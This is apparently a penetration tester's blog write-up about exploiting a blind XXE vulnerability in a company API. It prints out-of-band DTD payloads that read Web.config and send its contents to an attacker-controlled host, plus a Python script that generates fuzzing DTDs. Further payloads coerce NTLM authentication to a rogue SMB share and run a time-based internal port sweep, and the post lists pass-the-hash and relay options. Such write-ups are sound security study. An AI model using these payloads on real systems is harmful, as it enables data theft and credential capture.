<p>I am writing this post because of a recent chain of cool vulnerabilities I got the opportuninty to exploit during a pentest.</p>

<p><img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/2020-08-20-From-XXE-OOB-to-NTLM-thief/burp_collab.png" alt="" /></p>

<p>For security reasons, I am not going to reveal the name of the company, although the bugs have been mitigated.
The vulnerability got to compromise an API through an <a href="https://portswigger.net/web-security/xxe/blind">XXE OOB</a> vulnerability, from where I could read local files and also exfiltrate valuable data, such as domain name, username and NTLM hash. Finally, I <em>sorta</em> got access to a port scan just to look for internal ports.</p>

<h2 id="basic-poc"><a href="#header-2"></a>Basic PoC</h2>

<p>Let’s take a look on the original request from the page, intercepted with burp:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST blah/blah HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.3
Accept: */*
Postman-Token: XX
Host: XXX.YYY.ZZ
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 3292

{
  "device": {
    "brand": "xx",
    "model": "xx",
    "os": "xx",
    "deviceType": 1,
    "deviceOs": 1,
    "userInformation": {
      "phoneNumber": "xxx",
      "owner": {
        "firstName": "peep ",
        "surName": null,
        "lastName": "test "
      },
      "drivers": [
        {
          "firstName": "peep ",
          "surName": null,
          "lastName": "test "
        }
      ],
    },
    "deviceAttributes": [
      {
        "key": "LANGUAGE_CODE",
        "value": "es"
      }
    ],
    "kyrosDeviceId": null
  },
  "incidentType": 2,
  "xmlDisplay": null,
  "xmlCase": "&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
              &amp;lt;xmlCase version=&amp;quot;1.0&amp;quot;&amp;gt;
              &amp;lt;phone&amp;gt;
              &amp;lt;imei /&amp;gt;
              &amp;lt;/phone&amp;gt;
              &amp;lt;ResponseQuestions&amp;gt;
              &amp;lt;Questions&amp;gt;
              &amp;lt;Question&amp;gt;
              &amp;lt;Answers&amp;gt;
              &amp;lt;Answer&amp;gt;
              &amp;lt;AnswerId&amp;gt;
              1&amp;lt;/AnswerId&amp;gt;
              &amp;lt;TextAnswer&amp;gt;
              &amp;lt;Text&amp;gt;
              &amp;lt;LanguageCode&amp;gt;
              1&amp;lt;/LanguageCode&amp;gt;
              &amp;lt;Message&amp;gt;
              Avería&amp;lt;/Message&amp;gt;
              &amp;lt;/Text&amp;gt;
              &amp;lt;/TextAnswer&amp;gt;
              &amp;lt;Value&amp;gt;
              100&amp;lt;/Value&amp;gt;
              &amp;lt;/Answer&amp;gt;
              &amp;lt;/Answers&amp;gt;
              &amp;lt;Order&amp;gt;
              1&amp;lt;/Order&amp;gt;
              &amp;lt;QuestionId&amp;gt;
              1&amp;lt;/QuestionId&amp;gt;
              &amp;lt;TextQuestion&amp;gt;
              &amp;lt;Text&amp;gt;
              &amp;lt;LanguageCode&amp;gt;
              1&amp;lt;/LanguageCode&amp;gt;
              &amp;lt;Message&amp;gt;
              ¿Qué ha sucedido?&amp;lt;/Message&amp;gt;
              &amp;lt;/Text&amp;gt;
              &amp;lt;/TextQuestion&amp;gt;
              &amp;lt;/Question&amp;gt;
              &amp;lt;/Questions&amp;gt;
              &amp;lt;ReferenceId&amp;gt;
              ITPOLICY_0001&amp;lt;/ReferenceId&amp;gt;
              &amp;lt;/ResponseQuestions&amp;gt;
              &amp;lt;userdescription&amp;gt;
              &amp;lt;userdata&amp;gt;
              &amp;lt;language code=&amp;quot;es&amp;quot;&amp;gt;
              &amp;lt;field name=&amp;quot;NIF&amp;quot; attributeid=&amp;quot;3&amp;quot;&amp;gt;
              xx&amp;lt;/field&amp;gt;
              &amp;lt;field name=&amp;quot;Tipo Vehiculo&amp;quot; attributeid=&amp;quot;4&amp;quot;&amp;gt;
              Moto&amp;lt;/field&amp;gt;
              &amp;lt;field name=&amp;quot;Marca&amp;quot; attributeid=&amp;quot;5&amp;quot;&amp;gt;
              Bmw &amp;lt;/field&amp;gt;
              &amp;lt;field name=&amp;quot;Modelo&amp;quot; attributeid=&amp;quot;6&amp;quot;&amp;gt;
              &amp;lt;/field&amp;gt;
              &amp;lt;field name=&amp;quot;Matrícula&amp;quot; attributeid=&amp;quot;7&amp;quot;&amp;gt;
              xx&amp;lt;/field&amp;gt;
              &amp;lt;field name=&amp;quot;Combustible&amp;quot; attributeid=&amp;quot;9&amp;quot;&amp;gt;
              &amp;lt;/field&amp;gt;
              &amp;lt;/language&amp;gt;
              &amp;lt;/userdata&amp;gt;
              &amp;lt;/userdescription&amp;gt;
              &amp;lt;/xmlCase&amp;gt;",
  "userProfile": null
</code></pre></div></div>

<p>First thing I thought when I saw the request was the XML parameters of the data section (in fact, it was the only thing I saw interesting). If we HTML-decode it we have the following:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;xmlCase</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;phone&gt;</span>
		<span class="nt">&lt;imei</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;/phone&gt;</span>
	<span class="nt">&lt;ResponseQuestions&gt;</span>
		<span class="nt">&lt;Questions&gt;</span>
			<span class="nt">&lt;Question&gt;</span>
				<span class="nt">&lt;Answers&gt;</span>
					<span class="nt">&lt;Answer&gt;</span>
						<span class="nt">&lt;AnswerId&gt;</span>1<span class="nt">&lt;/AnswerId&gt;</span>
						<span class="nt">&lt;TextAnswer&gt;</span>
							<span class="nt">&lt;Text&gt;</span>
								<span class="nt">&lt;LanguageCode&gt;</span>1<span class="nt">&lt;/LanguageCode&gt;</span>
								<span class="nt">&lt;Message&gt;</span>Avería<span class="nt">&lt;/Message&gt;</span>
							<span class="nt">&lt;/Text&gt;</span>
						<span class="nt">&lt;/TextAnswer&gt;</span>
						<span class="nt">&lt;Value&gt;</span>100<span class="nt">&lt;/Value&gt;</span>
					<span class="nt">&lt;/Answer&gt;</span>
				<span class="nt">&lt;/Answers&gt;</span>
				<span class="nt">&lt;Order&gt;</span>1<span class="nt">&lt;/Order&gt;</span>
				<span class="nt">&lt;QuestionId&gt;</span>1<span class="nt">&lt;/QuestionId&gt;</span>
				<span class="nt">&lt;TextQuestion&gt;</span>
					<span class="nt">&lt;Text&gt;</span>
						<span class="nt">&lt;LanguageCode&gt;</span>1<span class="nt">&lt;/LanguageCode&gt;</span>
						<span class="nt">&lt;Message&gt;</span>¿Qué ha sucedido?<span class="nt">&lt;/Message&gt;</span>
					<span class="nt">&lt;/Text&gt;</span>
				<span class="nt">&lt;/TextQuestion&gt;</span>
			<span class="nt">&lt;/Question&gt;</span>
		<span class="nt">&lt;/Questions&gt;</span>
		<span class="nt">&lt;ReferenceId&gt;</span>ITPOLICY_0001<span class="nt">&lt;/ReferenceId&gt;</span>
	<span class="nt">&lt;/ResponseQuestions&gt;</span>
	<span class="nt">&lt;userdescription&gt;</span>
		<span class="nt">&lt;userdata&gt;</span>
			<span class="nt">&lt;language</span> <span class="na">code=</span><span class="s">"es"</span><span class="nt">&gt;</span>
				<span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">"NIF"</span> <span class="na">attributeid=</span><span class="s">"3"</span><span class="nt">&gt;</span>xx<span class="nt">&lt;/field&gt;</span>
				<span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">"Tipo Vehiculo"</span> <span class="na">attributeid=</span><span class="s">"4"</span><span class="nt">&gt;</span>Moto<span class="nt">&lt;/field&gt;</span>
				<span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">"Marca"</span> <span class="na">attributeid=</span><span class="s">"5"</span><span class="nt">&gt;</span>Bmw <span class="nt">&lt;/field&gt;</span>
				<span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">"Modelo"</span> <span class="na">attributeid=</span><span class="s">"6"</span><span class="nt">/&gt;</span>
				<span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">"Matrícula"</span> <span class="na">attributeid=</span><span class="s">"7"</span><span class="nt">&gt;</span>xx<span class="nt">&lt;/field&gt;</span>
				<span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">"Combustible"</span> <span class="na">attributeid=</span><span class="s">"9"</span><span class="nt">/&gt;</span>
			<span class="nt">&lt;/language&gt;</span>
		<span class="nt">&lt;/userdata&gt;</span>
	<span class="nt">&lt;/userdescription&gt;</span>
<span class="nt">&lt;/xmlCase&gt;</span>
</code></pre></div></div>

<p>I tried a basic Proof of concept with Burp Collaborator:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://abc.burpcollaborator.net"&gt;]&gt;&lt;xmlCase version="1.0"&gt;
	&lt;phone&gt;
		&lt;imei /&gt;
	&lt;/phone&gt;
	&lt;ResponseQuestions&gt;
		&lt;Questions&gt;
			&lt;Question&gt;
				&lt;Answers&gt;
					&lt;Answer&gt;
						&lt;AnswerId&gt;1&lt;/AnswerId&gt;
						&lt;TextAnswer&gt;
							&lt;Text&gt;
								&lt;LanguageCode&gt;1&lt;/LanguageCode&gt;
								&lt;Message&gt;Avería&lt;/Message&gt;
							&lt;/Text&gt;
						&lt;/TextAnswer&gt;
						&lt;Value&gt;100&lt;/Value&gt;
					&lt;/Answer&gt;
				&lt;/Answers&gt;
				&lt;Order&gt;1&lt;/Order&gt;
				&lt;QuestionId&gt;1&lt;/QuestionId&gt;
				&lt;TextQuestion&gt;
					&lt;Text&gt;
						&lt;LanguageCode&gt;1&lt;/LanguageCode&gt;
						&lt;Message&gt;¿Qué ha sucedido?&lt;/Message&gt;
					&lt;/Text&gt;
				&lt;/TextQuestion&gt;
			&lt;/Question&gt;
		&lt;/Questions&gt;
		&lt;ReferenceId&gt;ITPOLICY_0001&lt;/ReferenceId&gt;
	&lt;/ResponseQuestions&gt;
	&lt;userdescription&gt;
		&lt;userdata&gt;
			&lt;language code="es"&gt;
				&lt;field name="NIF" attributeid="3"&gt;xx&lt;/field&gt;
				&lt;field name="Tipo Vehiculo" attributeid="4"&gt;Moto&lt;/field&gt;
				&lt;field name="Marca" attributeid="5"&gt;Bmw &lt;/field&gt;
				&lt;field name="Modelo" attributeid="6"/&gt;
				&lt;field name="Matrícula" attributeid="7"&gt;xx&lt;/field&gt;
				&lt;field name="Combustible" attributeid="9"/&gt;
			&lt;/language&gt;
		&lt;/userdata&gt;
	&lt;/userdescription&gt;
&lt;/xmlCase&gt;
</code></pre></div></div>

<p>Looks like I got profit :D:</p>

<p><img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/2020-08-20-From-XXE-OOB-to-NTLM-thief/burp_collab.png" alt="" /></p>

<p>However, the response from the server shows nothing to me, so it is time to do a <em>XXE out of band</em>.</p>

<h2 id="lets-retrieve-files"><a href="#header-2"></a>Let’s retrieve files!</h2>

<p>Now I need to adapt my payload to make it connect to a server where I have control. From there, I need to publish a malicious DTD in order to test LFI. The payload will be:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://xx.xx.xx.xx:80/evil.dtd"&gt;</span> %xxe;]
</code></pre></div></div>

<p>And the external DTD that will be invoked will be something like this:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % file SYSTEM "file:///c:/Inetpub/wwwroot/Web.config"&gt;</span>
<span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
<span class="cp">&lt;!ENTITY % file "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://xx.xx.xx.xx:80/%file;'&gt;</span>"&gt;
%eval;
%exfiltrate;
</code></pre></div></div>

<p>Notice that I tried to retrieve a windows file. This is because in the header responses of the webapp, I saw it was running a IIS.
Okay, so now we just need to make the request while hosting a rogue web server in port 80 and…</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xx.xx.xx.xx - - [20/Aug/2020 18:01:59] "GET /evil.dtd HTTP/1.1" 200 -
xx.xx.xx.xx - - [20/Aug/2020 18:01:59] code 404, message File not found
xx.xx.xx.xx - - [20/Aug/2020 18:01:59] "GET /%0D%0A%3Cconfiguration%3E%0D%0A%20%20%20%20%3Csystem.webServer%3E%0D%0A%20%20%20%20%20%20%20%20%3Csecurity%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cauthorization%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cadd%20accessType=%22Allow%22%20users=%22*%22%20/%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/authorization%3E%0D%0A%20%20%20%20%20%20%20%20%3C/security%3E%0D%0A%20%20%20%20%3C/system.webServer%3E%0D%0A%3C/configuration%3E HTTP/1.1" 404
</code></pre></div></div>
<p>Yay we got LFI! Now I needed to look for more interesting files. I thought about using intruder to fuzz for windows/IIS interesting files. However, I realized that the file name was in the DTD, not in the request… I though about some dirty solution then lol.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'file.txt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
    
    <span class="n">line</span> <span class="o">=</span> <span class="n">fp</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">lower</span><span class="p">()</span>
    <span class="k">while</span> <span class="n">line</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"evil"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">".dtd"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&lt;!ENTITY % file SYSTEM </span><span class="se">\"</span><span class="s">file:///"</span> <span class="o">+</span> <span class="n">line</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&lt;!ENTITY % start </span><span class="se">\"</span><span class="s">&lt;![CDATA[</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&lt;!ENTITY % end </span><span class="se">\"</span><span class="s">]]&gt;</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&lt;!ENTITY % file </span><span class="se">\"</span><span class="s">&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&lt;!ENTITY % eval </span><span class="se">\"</span><span class="s">&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http:/xx.xx.xx.xx/%file;'&gt;</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%eval;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%exfiltrate;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">line</span> <span class="o">=</span> <span class="n">fp</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">lower</span><span class="p">()</span>
        <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
</code></pre></div></div>

<p>This script basically creates as many DTD files as lines in the wordlist I used to fuzz xD. Now it is only neccesary to run a Burp Intruder with evil0.dtd to evil[number of words in the wordlist, in my case 389].dtd.</p>

<p>After some bruteforce time (the API takes its time to response…), I only got a couple more files but nothing interesting… :(
How could I escalate the vulnerability now? After some time reading, I found this gem: https://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/</p>

<h3 id="xxe-to-steal-ntlm-hash"><a href="#header-3"></a>XXE to steal NTLM hash</h3>

<p>My external DTD will look like this:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'file://xx.xx.xx.xx/blah;'&gt;</span>"&gt;
%eval;
%exfiltrate;
</code></pre></div></div>
<p>What does it do? It basically forces the victim to connect to a SMB share exposed. This requires however a very bad network configuration that allows outbound traffic to unauthenticated rogue SMB exposed shares (spoiler: this is the case lol):
Now I just need to host a SMB capture server using metasploit:</p>

<p><img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/2020-08-20-From-XXE-OOB-to-NTLM-thief/msfsmb.png" alt="" /></p>

<p>Bingo!</p>

<p><img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/2020-08-20-From-XXE-OOB-to-NTLM-thief/smb.png" alt="" /></p>

<p>This is a win :D. In order to use this hash, we could use various methods:</p>

<ol>
  <li>Crack it and find an exposed RDP service of the server.</li>
  <li>Have access to the internal network and use SMBRelay+Responder to get a shell.</li>
  <li>Find an exposed Exchange server and PtH.</li>
</ol>

<p>None of them were available to me unfortunately, but I learnt a lot :D.</p>

<h2 id="bonus-track-port-scanner"><a href="#header-2"></a>Bonus track: Port scanner!</h2>

<p>As an extra, I used the DTD to make a port <code class="language-plaintext highlighter-rouge">sweep</code> (poorly useful, as this service was slow af) with a XXE OoB time-based.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://127.0.0.1:XX'&gt;</span>"&gt;
%eval;
%exfiltrate;
</code></pre></div></div>

<p>Where XX is the number of the port to test. If the port is open, it will typically take different time in the response than if it is closed. Although this worked in my case, it was not very useful because of two things:</p>
<ol>
  <li>Requests took ~90s of response time, which is not good for bruteforcing open ports.</li>
  <li>I did not have access to any of these services.</li>
</ol>

<p>I hope you liked it! :)</p>

